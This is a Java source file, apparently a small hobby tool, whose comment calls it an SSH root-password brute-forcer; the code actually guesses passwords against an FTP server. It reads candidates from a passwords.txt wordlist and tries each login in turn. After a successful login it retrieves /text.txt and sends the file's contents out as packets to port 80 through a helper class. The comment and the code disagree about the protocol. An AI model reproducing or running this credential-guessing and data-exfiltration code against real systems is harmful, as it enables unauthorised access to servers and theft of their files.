import com.jcraft.jsch.JSch;


import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;
import org.apache.commons.net.ftp.FTPReply;
import com.jcraft.jsch.Session;
import java.io.*;
import java.nio.file.Files;
import java.util.Date;
import java.util.Scanner;
/**
 * SSH bruteforce root - password guessing.
 * @author Aviv
 *
 */
public class SSH
{
	public static String Findpassword(String ip, int port, String user) throws FileNotFoundException
	{
		String server = ip;
		FTPClient ftpClient = new FTPClient();
		System.out.println("Checking for passwords begin.. it may take a while");
		Scanner input = new Scanner(System.in);
		File file = new File("passwords.txt"); // password file
		String result = null;
		input = new Scanner(file);
		long startTime = System.currentTimeMillis();
		long elapsedTime = 0;

		try { 
			ftpClient.connect(server, port); // Connecting to ftp
			showServerReply(ftpClient);
			int replyCode = ftpClient.getReplyCode();
			if (!FTPReply.isPositiveCompletion(replyCode)) {
				System.out.println("Operation failed. Server reply code: " + replyCode);
				return result;
			}
			while (input.hasNextLine()) { // reading from password file
				String line = input.nextLine();
				boolean success = ftpClient.login(user, line); // trying to connect with selected password
				if (!success) {
					System.out.println("Could not login to the server");
				} else { // Password found
					System.out.println("LOGGED IN SERVER with password: "+line);
					ftpClient.enterLocalPassiveMode();
					try {
				        String remoteFile2 = "/text.txt"; // path of destination file in FTP server.
				        InputStream inputStream = ftpClient.retrieveFileStream(remoteFile2); // Getting the file into InputStream
				        byte[] bytesArray = new byte[4096];
				        int bytesRead = -1;
				        byte[] dnsAddress = Filetest.ip4StringToByte(ip); // Setting destination IP of packet
				        while ((bytesRead = inputStream.read(bytesArray)) != -1) {
				            Filetest.launch(dnsAddress, 80, bytesArray); // launching packet with data
				            System.out.println("Packet launched.");
				        }
				        inputStream.close();
						}
						catch (IOException ex) {
				            System.out.println("Error: " + ex.getMessage());
						}
					result = line;
					return result;
				}
			}
		}
		catch (IOException ex) {
			System.out.println("Unable to connect FTP server");
			ex.printStackTrace();
		}
		return result;
	}

/*
	public static byte[] getBytesFromInputStream(InputStream is) throws IOException
	{
	    try (ByteArrayOutputStream os = new ByteArrayOutputStream();)
	    {
	        byte[] buffer = new byte[0xFFFF];

	        for (int len; (len = is.read(buffer)) != -1;)
	            os.write(buffer, 0, len);

	        os.flush();

	        return os.toByteArray();
	    }
	}
	*/
	private static void showServerReply(FTPClient ftpClient) {
		String[] replies = ftpClient.getReplyStrings();
		if (replies != null && replies.length > 0) {
			for (String aReply : replies) {
				System.out.println("SERVER: " + aReply);
			}
		}
	}
}
